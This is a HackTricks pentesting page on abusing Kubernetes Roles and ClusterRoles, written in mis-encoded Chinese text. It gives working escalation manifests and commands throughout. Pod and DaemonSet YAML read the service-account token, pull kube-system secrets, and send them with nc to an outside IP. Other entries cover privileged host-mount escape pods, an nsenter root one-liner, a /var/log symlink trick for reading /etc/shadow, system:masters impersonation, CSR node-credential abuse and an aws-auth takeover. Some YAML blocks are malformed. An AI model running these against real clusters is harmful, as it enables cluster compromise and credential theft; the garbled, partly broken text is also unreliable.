# åœ¨Kubernetesä¸­æ»¥ç”¨è§’è‰²/ClusterRoles

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[NFTsæ”¶è—å“](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘çš„**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

åœ¨è¿™é‡Œï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°ä¸€äº›æ½œåœ¨å±é™©çš„è§’è‰²å’ŒClusterRolesé…ç½®ã€‚\
è¯·è®°ä½ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ `kubectl api-resources` è·å–æ‰€æœ‰æ”¯æŒçš„èµ„æº

## **æƒé™æå‡**

åœ¨Kubernetesä¸­ï¼Œ**ç‰¹æƒå‡çº§**æŒ‡çš„æ˜¯ä»¥ä¸åŒçš„æƒé™ï¼ˆåœ¨Kubernetesé›†ç¾¤å†…æˆ–å¤–éƒ¨äº‘ä¸­ï¼‰è·å–å¯¹**ä¸åŒä¸»ä½“**çš„è®¿é—®æƒé™ï¼ˆæ¯”æ‚¨å½“å‰æ‹¥æœ‰çš„æ›´é«˜æƒé™ï¼‰çš„æŠ€æœ¯ã€‚åœ¨Kubernetesä¸­ï¼ŒåŸºæœ¬ä¸Šæœ‰**4ç§ä¸»è¦æŠ€æœ¯æ¥æå‡æƒé™**ï¼š

* èƒ½å¤Ÿ**å†’å……**å…¶ä»–å…·æœ‰æ›´é«˜æƒé™çš„ç”¨æˆ·/ç»„/SAsï¼Œæ— è®ºæ˜¯åœ¨Kubernetesé›†ç¾¤å†…è¿˜æ˜¯å¤–éƒ¨äº‘ä¸­
* èƒ½å¤Ÿ**åˆ›å»º/ä¿®è¡¥/æ‰§è¡ŒPods**ï¼Œåœ¨å…¶ä¸­æ‚¨å¯ä»¥æ‰¾åˆ°æˆ–é™„åŠ å…·æœ‰æ›´é«˜æƒé™çš„SAsï¼Œæ— è®ºæ˜¯åœ¨Kubernetesé›†ç¾¤å†…è¿˜æ˜¯å¤–éƒ¨äº‘ä¸­
* èƒ½å¤Ÿ**è¯»å–ç§˜å¯†**ï¼Œå› ä¸ºSAsä»¤ç‰Œå­˜å‚¨ä¸ºç§˜å¯†
* èƒ½å¤Ÿ**ä»å®¹å™¨ä¸­é€ƒé€¸åˆ°èŠ‚ç‚¹**ï¼Œåœ¨é‚£é‡Œæ‚¨å¯ä»¥çªƒå–èŠ‚ç‚¹ä¸­è¿è¡Œçš„å®¹å™¨çš„æ‰€æœ‰ç§˜å¯†ã€èŠ‚ç‚¹çš„å‡­æ®ä»¥åŠèŠ‚ç‚¹åœ¨å…¶è¿è¡Œçš„äº‘ä¸­çš„æƒé™ï¼ˆå¦‚æœæœ‰çš„è¯ï¼‰
* å€¼å¾—ä¸€æçš„ç¬¬äº”ç§æŠ€æœ¯æ˜¯èƒ½å¤Ÿåœ¨Podä¸­**è¿è¡Œç«¯å£è½¬å‘**ï¼Œå› ä¸ºæ‚¨å¯èƒ½èƒ½å¤Ÿè®¿é—®è¯¥Podä¸­çš„æœ‰è¶£èµ„æºã€‚

### è®¿é—®ä»»ä½•èµ„æºæˆ–åŠ¨è¯ï¼ˆé€šé…ç¬¦ï¼‰

**é€šé…ç¬¦ï¼ˆ\*ï¼‰å…è®¸å¯¹ä»»ä½•èµ„æºä½¿ç”¨ä»»ä½•åŠ¨è¯**ã€‚ç®¡ç†å‘˜ä¼šä½¿ç”¨å®ƒã€‚åœ¨ClusterRoleä¸­ï¼Œè¿™æ„å‘³ç€æ”»å‡»è€…å¯ä»¥æ»¥ç”¨é›†ç¾¤ä¸­çš„ä»»ä½•å‘½åç©ºé—´ã€‚
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["*"]
```
### ä½¿ç”¨ç‰¹å®šåŠ¨è¯è®¿é—®ä»»ä½•èµ„æº

åœ¨RBACä¸­ï¼ŒæŸäº›æƒé™å­˜åœ¨é‡å¤§é£é™©ï¼š

1. **`create`:** å…è®¸åˆ›å»ºä»»ä½•é›†ç¾¤èµ„æºï¼Œå­˜åœ¨ç‰¹æƒå‡çº§é£é™©ã€‚
2. **`list`:** å…è®¸åˆ—å‡ºæ‰€æœ‰èµ„æºï¼Œå¯èƒ½æ³„éœ²æ•æ„Ÿæ•°æ®ã€‚
3. **`get`:** å…è®¸è®¿é—®æœåŠ¡è´¦æˆ·ä¸­çš„ç§˜å¯†ï¼Œæ„æˆå®‰å…¨å¨èƒã€‚
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["create", "list", "get"]
```
### Podåˆ›å»º - çªƒå–ä»¤ç‰Œ

æ‹¥æœ‰åˆ›å»ºpodæƒé™çš„æ”»å‡»è€…å¯ä»¥å°†ä¸€ä¸ªç‰¹æƒæœåŠ¡è´¦æˆ·é™„åŠ åˆ°podä¸­ï¼Œå¹¶çªƒå–ä»¤ç‰Œä»¥å†’å……è¯¥æœåŠ¡è´¦æˆ·ã€‚æœ‰æ•ˆåœ°æå‡äº†æƒé™ã€‚

ä»¥ä¸‹æ˜¯ä¸€ä¸ªç¤ºä¾‹podï¼Œå°†çªƒå–`bootstrap-signer`æœåŠ¡è´¦æˆ·çš„ä»¤ç‰Œå¹¶å°†å…¶å‘é€ç»™æ”»å‡»è€…ï¼š
```yaml
apiVersion: v1
kind: Pod
metadata:
name: alpine
namespace: kube-system
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
```
### Podåˆ›å»ºä¸é€ƒé€¸

ä»¥ä¸‹åˆ—å‡ºäº†å®¹å™¨å¯èƒ½å…·æœ‰çš„æ‰€æœ‰ç‰¹æƒï¼š

- **ç‰¹æƒè®¿é—®**ï¼ˆç¦ç”¨ä¿æŠ¤å¹¶è®¾ç½®åŠŸèƒ½ï¼‰
- **ç¦ç”¨å‘½åç©ºé—´hostIPCå’ŒhostPid**ï¼Œå¯å¸®åŠ©æå‡ç‰¹æƒ
- **ç¦ç”¨hostNetwork**å‘½åç©ºé—´ï¼Œä½¿å¾—å¯ä»¥çªƒå–èŠ‚ç‚¹äº‘ç‰¹æƒå¹¶æ›´å¥½åœ°è®¿é—®ç½‘ç»œ
- **å°†ä¸»æœºçš„/** æŒ‚è½½åˆ°å®¹å™¨ä¸­

{% code title="super_privs.yaml" %}
```yaml
apiVersion: v1
kind: Pod
metadata:
name: ubuntu
labels:
app: ubuntu
spec:
# Uncomment and specify a specific node you want to debug
# nodeName: <insert-node-name-here>
containers:
- image: ubuntu
command:
- "sleep"
- "3600" # adjust this as needed -- use only as long as you need
imagePullPolicy: IfNotPresent
name: ubuntu
securityContext:
allowPrivilegeEscalation: true
privileged: true
#capabilities:
#  add: ["NET_ADMIN", "SYS_ADMIN"] # add the capabilities you need https://man7.org/linux/man-pages/man7/capabilities.7.html
runAsUser: 0 # run as root (or any other user)
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never # we want to be intentional about running this pod
hostIPC: true # Use the host's ipc namespace https://www.man7.org/linux/man-pages/man7/ipc_namespaces.7.html
hostNetwork: true # Use the host's network namespace https://www.man7.org/linux/man-pages/man7/network_namespaces.7.html
hostPID: true # Use the host's pid namespace https://man7.org/linux/man-pages/man7/pid_namespaces.7.htmlpe_
volumes:
- name: host-volume
hostPath:
path: /
```
{% endcode %}

ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤åˆ›å»ºPodï¼š
```bash
kubectl --token $token create -f mount_root.yaml
```
æ¥è‡ª[è¿™æ¡æ¨æ–‡](https://twitter.com/mauilion/status/1129468485480751104)çš„ä¸€å¥è¯ï¼Œå¹¶é™„åŠ ä¸€äº›å†…å®¹ï¼š
```bash
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```
ç°åœ¨ï¼Œæ‚¨å¯ä»¥é€ƒé€¸åˆ°èŠ‚ç‚¹æ£€æŸ¥åæ¸—é€æŠ€æœ¯ä¸­ï¼š

#### éšèº«

æ‚¨å¯èƒ½å¸Œæœ›æ›´åŠ **éšç§˜**ï¼Œåœ¨æ¥ä¸‹æ¥çš„é¡µé¢ä¸­ï¼Œæ‚¨å¯ä»¥çœ‹åˆ°å¦‚æœåˆ›å»ºä¸€ä¸ªä»…å¯ç”¨å…ˆå‰æ¨¡æ¿ä¸­æåˆ°çš„æŸäº›ç‰¹æƒçš„ podï¼Œæ‚¨å°†èƒ½å¤Ÿè®¿é—®ä»€ä¹ˆï¼š

- **ç‰¹æƒ + hostPID**
- **ä»…ç‰¹æƒ**
- **hostPath**
- **hostPID**
- **hostNetwork**
- **hostIPC**

_æ‚¨å¯ä»¥åœ¨_ [_https://github.com/BishopFox/badPods_](https://github.com/BishopFox/badPods) _æ‰¾åˆ°å¦‚ä½•åˆ›å»º/æ»¥ç”¨å…ˆå‰ç‰¹æƒ pod é…ç½®çš„ç¤ºä¾‹_

### åˆ›å»º Pod - è¿ç§»åˆ°äº‘

å¦‚æœæ‚¨å¯ä»¥**åˆ›å»º**ä¸€ä¸ª**pod**ï¼ˆå¹¶å¯é€‰åœ°åˆ›å»ºä¸€ä¸ª**æœåŠ¡è´¦æˆ·**ï¼‰ï¼Œæ‚¨å¯èƒ½èƒ½å¤Ÿé€šè¿‡**å°†äº‘è§’è‰²åˆ†é…ç»™ä¸€ä¸ª pod æˆ–æœåŠ¡è´¦æˆ·**ç„¶åè®¿é—®å®ƒæ¥**åœ¨äº‘ç¯å¢ƒä¸­è·å¾—ç‰¹æƒ**ã€‚\
æ­¤å¤–ï¼Œå¦‚æœæ‚¨å¯ä»¥åˆ›å»ºä¸€ä¸ª**å…·æœ‰ä¸»æœºç½‘ç»œå‘½åç©ºé—´çš„ pod**ï¼Œæ‚¨å¯ä»¥**çªƒå–èŠ‚ç‚¹å®ä¾‹çš„ IAM** è§’è‰²ã€‚

æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ï¼š

{% content-ref url="pod-escape-privileges.md" %}
[pod-escape-privileges.md](pod-escape-privileges.md)
{% endcontent-ref %}

### **åˆ›å»º/ä¿®è¡¥ Deploymentã€Daemonsetsã€Statefulsetsã€Replicationcontrollersã€Replicasetsã€Jobs å’Œ Cronjobs**

å¯ä»¥æ»¥ç”¨è¿™äº›æƒé™æ¥**åˆ›å»ºä¸€ä¸ªæ–°çš„ pod**å¹¶åƒå…ˆå‰çš„ç¤ºä¾‹ä¸­é‚£æ ·è·å¾—ç‰¹æƒã€‚

ä»¥ä¸‹ yaml **åˆ›å»ºä¸€ä¸ª daemonset å¹¶å°† SA çš„ä»¤ç‰Œå¤–æ³„åˆ° pod ä¸­**ï¼š
```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
name: alpine
namespace: kube-system
spec:
selector:
matchLabels:
name: alpine
template:
metadata:
labels:
name: alpine
spec:
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
volumeMounts:
- mountPath: /root
name: mount-node-root
volumes:
- name: mount-node-root
hostPath:
path: /
```
### **Pods Exec**

**`pods/exec`** æ˜¯ Kubernetes ä¸­ç”¨äºåœ¨ **Pod å†…éƒ¨çš„ shell ä¸­è¿è¡Œå‘½ä»¤** çš„èµ„æºã€‚è¿™å…è®¸ **åœ¨å®¹å™¨å†…è¿è¡Œå‘½ä»¤æˆ–è·å– shell**ã€‚

å› æ­¤ï¼Œå¯ä»¥ **è¿›å…¥ä¸€ä¸ª Pod å¹¶çªƒå– SA çš„ä»¤ç‰Œ**ï¼Œæˆ–è€…è¿›å…¥ä¸€ä¸ªç‰¹æƒ Podï¼Œé€ƒé€¸åˆ°èŠ‚ç‚¹ï¼Œå¹¶çªƒå–èŠ‚ç‚¹ä¸­æ‰€æœ‰ Pod çš„ä»¤ç‰Œå¹¶ï¼ˆæ»¥ç”¨ï¼‰è¯¥èŠ‚ç‚¹ï¼š
```bash
kubectl exec -it <POD_NAME> -n <NAMESPACE> -- sh
```
### ç«¯å£è½¬å‘

æ­¤æƒé™å…è®¸**å°†ä¸€ä¸ªæœ¬åœ°ç«¯å£è½¬å‘åˆ°æŒ‡å®š pod ä¸­çš„ä¸€ä¸ªç«¯å£**ã€‚è¿™æ—¨åœ¨ä½¿å¾—èƒ½å¤Ÿè½»æ¾è°ƒè¯•åœ¨ pod ä¸­è¿è¡Œçš„åº”ç”¨ç¨‹åºï¼Œä½†æ”»å‡»è€…å¯èƒ½æ»¥ç”¨æ­¤æƒé™æ¥è®¿é—® pod å†…éƒ¨çš„æœ‰è¶£å†…å®¹ï¼ˆå¦‚æ•°æ®åº“ï¼‰æˆ–æ˜“å—æ”»å‡»çš„åº”ç”¨ç¨‹åºï¼ˆç½‘ç«™ï¼Ÿï¼‰ã€‚
```
kubectl port-forward pod/mypod 5000:5000
```
### ä¸»æœºå¯å†™ /var/log/ é€ƒé€¸

æ­£å¦‚[**è¿™é¡¹ç ”ç©¶æ‰€æŒ‡å‡ºçš„**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html)ï¼Œå¦‚æœæ‚¨å¯ä»¥è®¿é—®æˆ–åˆ›å»ºä¸€ä¸ª**æŒ‚è½½äº†ä¸»æœº `/var/log/` ç›®å½•**çš„ podï¼Œæ‚¨å°±å¯ä»¥**ä»å®¹å™¨ä¸­é€ƒé€¸**ã€‚\
è¿™åŸºæœ¬ä¸Šæ˜¯å› ä¸ºå½“**Kube-API å°è¯•è·å–å®¹å™¨çš„æ—¥å¿—**ï¼ˆä½¿ç”¨ `kubectl logs <pod>`ï¼‰æ—¶ï¼Œå®ƒä¼šä½¿ç”¨ **Kubelet** æœåŠ¡çš„ `/logs/` ç«¯ç‚¹æ¥è¯·æ±‚ pod çš„ `0.log` æ–‡ä»¶ã€‚\
Kubelet æœåŠ¡å…¬å¼€äº† `/logs/` ç«¯ç‚¹ï¼Œè¿™åŸºæœ¬ä¸Šå°±æ˜¯**æš´éœ²äº†å®¹å™¨çš„ `/var/log` æ–‡ä»¶ç³»ç»Ÿ**ã€‚

å› æ­¤ï¼Œä¸€ä¸ªå…·æœ‰**å†™å…¥å®¹å™¨ /var/log/ æ–‡ä»¶å¤¹æƒé™**çš„æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ç§è¡Œä¸ºæ–¹å¼ï¼š

* ä¿®æ”¹å…¶å®¹å™¨çš„ `0.log` æ–‡ä»¶ï¼ˆé€šå¸¸ä½äº `/var/logs/pods/namespace_pod_uid/container/0.log`ï¼‰ä¸ºæŒ‡å‘ `/etc/shadow` çš„**ç¬¦å·é“¾æ¥**ã€‚ç„¶åï¼Œæ‚¨å°±å¯ä»¥æ‰§è¡Œä»¥ä¸‹æ“ä½œæ¥çªƒå–ä¸»æœºçš„ shadow æ–‡ä»¶ï¼š
```bash
kubectl logs escaper
failed to get parse function: unsupported log format: "root::::::::\n"
kubectl logs escaper --tail=2
failed to get parse function: unsupported log format: "systemd-resolve:*:::::::\n"
# Keep incrementing tail to exfiltrate the whole file
```
* å¦‚æœæ”»å‡»è€…æ§åˆ¶ä»»ä½•å…·æœ‰**è¯»å– `nodes/log` æƒé™çš„ä¸»ä½“**ï¼Œä»–å¯ä»¥åœ¨ `/host-mounted/var/log/sym` ä¸­åˆ›å»ºä¸€ä¸ª**ç¬¦å·é“¾æ¥**æŒ‡å‘ `/`ï¼Œå½“**è®¿é—® `https://<gateway>:10250/logs/sym/` æ—¶ï¼Œä»–å°†åˆ—å‡ºä¸»æœºçš„æ ¹**æ–‡ä»¶ç³»ç»Ÿï¼ˆæ›´æ”¹ç¬¦å·é“¾æ¥å¯ä»¥æä¾›å¯¹æ–‡ä»¶çš„è®¿é—®ï¼‰ã€‚
```bash
curl -k -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Im[...]' 'https://172.17.0.1:10250/logs/sym/'
<a href="bin">bin</a>
<a href="data/">data/</a>
<a href="dev/">dev/</a>
<a href="etc/">etc/</a>
<a href="home/">home/</a>
<a href="init">init</a>
<a href="lib">lib</a>
[...]
```
**å¯ä»¥åœ¨** [**https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts**](https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts) **æ‰¾åˆ°ä¸€ä¸ªå®éªŒå®¤å’Œè‡ªåŠ¨åŒ–åˆ©ç”¨ã€‚**

#### ç»•è¿‡readOnlyä¿æŠ¤ <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

å¦‚æœä½ è¶³å¤Ÿå¹¸è¿ï¼Œå¹¶ä¸”é«˜åº¦ç‰¹æƒçš„èƒ½åŠ› `CAP_SYS_ADMIN` å¯ç”¨ï¼Œä½ å¯ä»¥é‡æ–°å°†æ–‡ä»¶å¤¹æŒ‚è½½ä¸ºè¯»å†™ï¼š
```bash
mount -o rw,remount /hostlogs/
```
#### ç»•è¿‡ hostPath readOnly ä¿æŠ¤ <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

å¦‚[**è¿™é¡¹ç ”ç©¶**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html)æ‰€è¿°ï¼Œå¯ä»¥ç»•è¿‡è¿™ç§ä¿æŠ¤ï¼š
```yaml
allowedHostPaths:
- pathPrefix: "/foo"
readOnly: true
```
è¿™æ˜¯ä¸ºäº†é˜²æ­¢åƒä¹‹å‰é‚£æ ·çš„é€ƒé€¸ï¼Œè€Œä¸æ˜¯ä½¿ç”¨hostPathæŒ‚è½½ï¼Œè€Œæ˜¯ä½¿ç”¨PersistentVolumeå’ŒPersistentVolumeClaimæ¥æŒ‚è½½å®¹å™¨ä¸­å…·æœ‰å¯å†™è®¿é—®æƒé™çš„ä¸»æœºæ–‡ä»¶å¤¹ï¼š
```yaml
apiVersion: v1
kind: PersistentVolume
metadata:
name: task-pv-volume-vol
labels:
type: local
spec:
storageClassName: manual
capacity:
storage: 10Gi
accessModes:
- ReadWriteOnce
hostPath:
path: "/var/log"
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
name: task-pv-claim-vol
spec:
storageClassName: manual
accessModes:
- ReadWriteOnce
resources:
requests:
storage: 3Gi
---
apiVersion: v1
kind: Pod
metadata:
name: task-pv-pod
spec:
volumes:
- name: task-pv-storage-vol
persistentVolumeClaim:
claimName: task-pv-claim-vol
containers:
- name: task-pv-container
image: ubuntu:latest
command: [ "sh", "-c", "sleep 1h" ]
volumeMounts:
- mountPath: "/hostlogs"
name: task-pv-storage-vol
```
### **å†’å……ç‰¹æƒè´¦æˆ·**

é€šè¿‡[**ç”¨æˆ·å†’å……**](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation)æƒé™ï¼Œæ”»å‡»è€…å¯ä»¥å†’å……ä¸€ä¸ªç‰¹æƒè´¦æˆ·ã€‚

åªéœ€åœ¨`kubectl`å‘½ä»¤ä¸­ä½¿ç”¨å‚æ•°`--as=<username>`æ¥å†’å……ä¸€ä¸ªç”¨æˆ·ï¼Œæˆ–è€…ä½¿ç”¨`--as-group=<group>`æ¥å†’å……ä¸€ä¸ªç»„ï¼š
```bash
kubectl get pods --as=system:serviceaccount:kube-system:default
kubectl get secrets --as=null --as-group=system:masters
```
æˆ–è€…ä½¿ç”¨ REST APIï¼š
```bash
curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" \
-H "Impersonate-Group: system:masters"\
-H "Impersonate-User: null" \
-H "Accept: application/json" \
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### åˆ—å‡ºç§˜å¯†

å…è®¸**åˆ—å‡ºç§˜å¯†çš„æƒé™å¯èƒ½ä½¿æ”»å‡»è€…èƒ½å¤Ÿå®é™…è¯»å–ç§˜å¯†**å¹¶è®¿é—®REST APIç«¯ç‚¹ï¼š
```bash
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### è¯»å–ç§˜å¯† - æš´åŠ›ç ´è§£ä»¤ç‰ŒID

å°½ç®¡æŒæœ‰å…·æœ‰è¯»å–æƒé™çš„ä»¤ç‰Œçš„æ”»å‡»è€…éœ€è¦ç¡®åˆ‡çš„ç§˜å¯†åç§°æ‰èƒ½ä½¿ç”¨å®ƒï¼Œä¸æ›´å¹¿æ³›çš„_**åˆ—å‡ºç§˜å¯†**_æƒé™ä¸åŒï¼Œä»ç„¶å­˜åœ¨æ¼æ´ã€‚ç³»ç»Ÿä¸­çš„é»˜è®¤æœåŠ¡è´¦æˆ·å¯ä»¥è¢«æšä¸¾ï¼Œæ¯ä¸ªè´¦æˆ·å…³è”ä¸€ä¸ªç§˜å¯†ã€‚è¿™äº›ç§˜å¯†å…·æœ‰åç§°ç»“æ„ï¼šä¸€ä¸ªé™æ€å‰ç¼€ï¼Œåè·Ÿä¸€ä¸ªéšæœºçš„äº”ä¸ªå­—ç¬¦çš„å­—æ¯æ•°å­—ä»¤ç‰Œï¼ˆä¸åŒ…æ‹¬æŸäº›å­—ç¬¦ï¼‰ï¼Œæ ¹æ®[æºä»£ç ](https://github.com/kubernetes/kubernetes/blob/8418cccaf6a7307479f1dfeafb0d2823c1c37802/staging/src/k8s.io/apimachinery/pkg/util/rand/rand.go#L83)ã€‚

ä»¤ç‰Œæ˜¯ä»ä¸€ä¸ªæœ‰é™çš„27ä¸ªå­—ç¬¦é›†ï¼ˆ`bcdfghjklmnpqrstvwxz2456789`ï¼‰ç”Ÿæˆçš„ï¼Œè€Œä¸æ˜¯å®Œæ•´çš„å­—æ¯æ•°å­—èŒƒå›´ã€‚è¿™ç§é™åˆ¶å°†æ€»å¯èƒ½ç»„åˆå‡å°‘åˆ°14,348,907ï¼ˆ27^5ï¼‰ã€‚å› æ­¤ï¼Œæ”»å‡»è€…å¯ä»¥æœ‰å¯èƒ½åœ¨å‡ å°æ—¶å†…æ‰§è¡Œæš´åŠ›ç ´è§£æ”»å‡»æ¥æ¨æ–­ä»¤ç‰Œï¼Œæ½œåœ¨åœ°å¯¼è‡´é€šè¿‡è®¿é—®æ•æ„ŸæœåŠ¡è´¦æˆ·è€Œæå‡æƒé™ã€‚

### è¯ä¹¦ç­¾åè¯·æ±‚

å¦‚æœæ‚¨åœ¨èµ„æº`certificatesigningrequests`ä¸­å…·æœ‰**`create`**åŠ¨è¯ï¼ˆæˆ–è‡³å°‘åœ¨`certificatesigningrequests/nodeClient`ä¸­ï¼‰ã€‚æ‚¨å¯ä»¥**åˆ›å»º**ä¸€ä¸ªæ–°èŠ‚ç‚¹çš„æ–°CeSRã€‚

æ ¹æ®[æ–‡æ¡£ï¼Œå¯ä»¥è‡ªåŠ¨æ‰¹å‡†è¿™äº›è¯·æ±‚](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet-tls-bootstrapping/)ï¼Œå› æ­¤åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨**ä¸éœ€è¦é¢å¤–çš„æƒé™**ã€‚å¦‚æœæ²¡æœ‰ï¼Œæ‚¨å°†éœ€è¦èƒ½å¤Ÿæ‰¹å‡†è¯¥è¯·æ±‚ï¼Œè¿™æ„å‘³ç€åœ¨`certificatesigningrequests/approval`ä¸­è¿›è¡Œæ›´æ–°ï¼Œå¹¶åœ¨`signers`ä¸­ä½¿ç”¨èµ„æºåç§°`<signerNameDomain>/<signerNamePath>`æˆ–`<signerNameDomain>/*`è¿›è¡Œæ‰¹å‡†ã€‚

ä¸€ä¸ªå…·æœ‰æ‰€æœ‰æ‰€éœ€æƒé™çš„**è§’è‰²ç¤ºä¾‹**æ˜¯ï¼š
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: csr-approver
rules:
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests
verbs:
- get
- list
- watch
- create
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests/approval
verbs:
- update
- apiGroups:
- certificates.k8s.io
resources:
- signers
resourceNames:
- example.com/my-signer-name # example.com/* can be used to authorize for all signers in the 'example.com' domain
verbs:
- approve
```
æ‰€ä»¥ï¼Œé€šè¿‡æ–°çš„èŠ‚ç‚¹CSRè·å‡†ï¼Œæ‚¨å¯ä»¥**æ»¥ç”¨**èŠ‚ç‚¹çš„ç‰¹æ®Šæƒé™æ¥**çªƒå–æœºå¯†**å¹¶**æå‡æƒé™**ã€‚

åœ¨[**è¿™ç¯‡æ–‡ç« **](https://www.4armed.com/blog/hacking-kubelet-on-gke/)å’Œ[**è¿™ç¯‡**](https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/)ä¸­ï¼ŒGKE K8s TLSå¼•å¯¼é…ç½®é…ç½®ä¸º**è‡ªåŠ¨ç­¾å**ï¼Œå¹¶è¢«æ»¥ç”¨ä»¥ç”Ÿæˆæ–°K8sèŠ‚ç‚¹çš„å‡­æ®ï¼Œç„¶åé€šè¿‡çªƒå–æœºå¯†æ¥æå‡æƒé™ã€‚\
å¦‚æœæ‚¨**æ‹¥æœ‰æåˆ°çš„æƒé™ï¼Œæ‚¨å¯ä»¥åšåŒæ ·çš„äº‹æƒ…**ã€‚è¯·æ³¨æ„ï¼Œç¬¬ä¸€ä¸ªç¤ºä¾‹ç»•è¿‡äº†é˜»æ­¢æ–°èŠ‚ç‚¹è®¿é—®å®¹å™¨å†…æœºå¯†çš„é”™è¯¯ï¼Œå› ä¸º**èŠ‚ç‚¹åªèƒ½è®¿é—®æŒ‚è½½åœ¨å…¶ä¸Šçš„å®¹å™¨çš„æœºå¯†**ã€‚

è¦ç»•è¿‡è¿™ä¸€ç‚¹ï¼Œåªéœ€**ä¸ºæŒ‚è½½æœ‰æœ‰è¶£æœºå¯†çš„å®¹å™¨çš„èŠ‚ç‚¹åç§°åˆ›å»ºèŠ‚ç‚¹å‡­æ®**ï¼ˆä½†è¯·æŸ¥çœ‹å¦‚ä½•åœ¨ç¬¬ä¸€ç¯‡æ–‡ç« ä¸­æ‰§è¡Œï¼‰:
```bash
"/O=system:nodes/CN=system:node:gke-cluster19-default-pool-6c73b1-8cj1"
```
### AWS EKS aws-auth configmaps

åœ¨ EKS ä¸Šçš„ kube-system å‘½åç©ºé—´ä¸­å¯ä»¥ä¿®æ”¹ **`configmaps`** çš„ä¸»ä½“ï¼ˆéœ€è¦åœ¨ AWS ä¸­ï¼‰é›†ç¾¤å¯ä»¥é€šè¿‡è¦†ç›– **aws-auth** configmap è·å¾—é›†ç¾¤ç®¡ç†å‘˜ç‰¹æƒã€‚\
æ‰€éœ€çš„åŠ¨è¯æ˜¯ **`update`** å’Œ **`patch`**ï¼Œæˆ–è€…å¦‚æœ configmap å°šæœªåˆ›å»ºï¼Œåˆ™æ˜¯ **`create`**ï¼š
```bash
# Check if config map exists
get configmap aws-auth -n kube-system -o yaml

## Yaml example
apiVersion: v1
kind: ConfigMap
metadata:
name: aws-auth
namespace: kube-system
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters

# Create donfig map is doesn't exist
## Using kubectl and the previous yaml
kubectl apply -f /tmp/aws-auth.yaml
